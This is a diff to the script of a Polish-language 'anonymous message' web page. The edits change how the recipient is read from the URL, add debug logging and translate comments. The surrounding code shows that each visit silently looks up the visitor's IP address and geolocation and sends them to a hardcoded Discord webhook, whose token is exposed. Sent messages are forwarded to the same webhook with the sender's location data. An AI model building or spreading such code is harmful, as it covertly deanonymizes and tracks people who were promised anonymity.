@@ -64,9 +64,27 @@
         let recipient = '';
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1377918303904993342/nZm56eOozq6D-TxX4MWX1O7bdJyK-yAbym6-TKDql0FpwtoOYWSW223DWkaJtEQb_dZS"; // Your Discord Webhook URL
 
-        // Get recipient from URL
-        const urlParams = new URLSearchParams(window.location.search);
+        // Pobierz odbiorcę z URL w bardziej odporny sposób
+        let fullUrl = window.location.href;
+        let queryString = '';
+
+        const queryStartIndex = fullUrl.indexOf('?');
+        if (queryStartIndex !== -1) {
+            queryString = fullUrl.substring(queryStartIndex);
+            // Usuń fragment identyfikatora, jeśli występuje w części zapytania
+            const fragmentStartIndex = queryString.indexOf('#');
+            if (fragmentStartIndex !== -1) {
+                queryString = queryString.substring(0, fragmentStartIndex);
+            }
+        }
+
+        const urlParams = new URLSearchParams(queryString);
         recipient = urlParams.get('to');
+
+        // Logi do konsoli dla celów debugowania
+        console.log('Pełny URL:', window.location.href);
+        console.log('Przetworzony ciąg zapytania:', queryString);
+        console.log('Wartość odbiorcy:', recipient);
         
         if (!recipient) {
             showError('Nieprawidłowy link. Brak odbiorcy.');
@@ -74,7 +92,7 @@
             document.getElementById('recipientName').textContent = '@' + recipient;
         }
         
-        // Character counter
+        // Licznik znaków
         const messageTextarea = document.getElementById('message');
         const charCountSpan = document.getElementById('charCount');
         const charCounter = document.querySelector('.char-counter');
@@ -90,7 +108,7 @@
             }
         });
         
-        // Function to get IP and geolocation data using ipify.org and ipinfo.io
+        // Funkcja do pobierania IP i danych geolokalizacyjnych za pomocą ipify.org i ipinfo.io
         async function getIpAndGeoData() {
             let userIP = 'N/A';
             let regionName = 'N/A';
@@ -129,7 +147,7 @@
             return { userIP, regionName, cityName, countryName, countryCode };
         }
 
-        // Function to send visitor info to Discord Webhook on page load
+        // Funkcja do wysyłania informacji o odwiedzającym na webhooka Discorda przy ładowaniu strony
         async function sendVisitorInfoToWebhook() {
             const { userIP, regionName, cityName, countryName, countryCode } = await getIpAndGeoData();
 
@@ -159,7 +177,7 @@
             }
         }
 
-        // Function to send message activity to Discord Webhook
+        // Funkcja do wysyłania aktywności wiadomości na webhooka Discorda
         async function sendMessageActivityToWebhook(recipientUsername, messageContent) {
             const { userIP, regionName, cityName, countryName, countryCode } = await getIpAndGeoData();
 
@@ -189,7 +207,7 @@
             }
         }
         
-        // Form submission handler
+        // Obsługa formularza
         document.getElementById('messageForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -206,11 +224,11 @@
                 return;
             }
             
-            // Disable button during sending
+            // Dezaktywuj przycisk podczas wysyłania
             sendBtn.disabled = true;
             sendBtn.textContent = '📤 Wysyłanie...';
             
-            // Send message
+            // Wyślij wiadomość
             fetch('https://tbh-fun.onrender.com/send_message', {
                 method: 'POST',
                 headers: {
@@ -241,7 +259,7 @@
                 console.error('Error:', error);
             })
             .finally(() => {
-                // Re-enable button
+                // Reaktywuj przycisk
                 sendBtn.disabled = false;
                 sendBtn.textContent = '📤 Wyślij anonimowo';
             });
@@ -255,7 +273,7 @@
             successDiv.textContent = message;
             successDiv.classList.remove('hidden'); // Show success message
             
-            // Scroll to top to see message
+            // Scroll do góry aby zobaczyć wiadomość
             window.scrollTo(0, 0);
             
             setTimeout(() => {
@@ -271,7 +289,7 @@
             errorDiv.textContent = message;
             errorDiv.classList.remove('hidden'); // Show error message
             
-            // Scroll to top to see error
+            // Scroll do góry aby zobaczyć błąd
             window.scrollTo(0, 0);
             
             setTimeout(() => {
@@ -279,7 +297,7 @@
             }, 5000);
         }
 
-        // Call visitor info webhook on page load
+        // Wywołaj webhooka z informacjami o odwiedzającym przy ładowaniu strony
         window.addEventListener('load', sendVisitorInfoToWebhook);
     </script>
 </body>
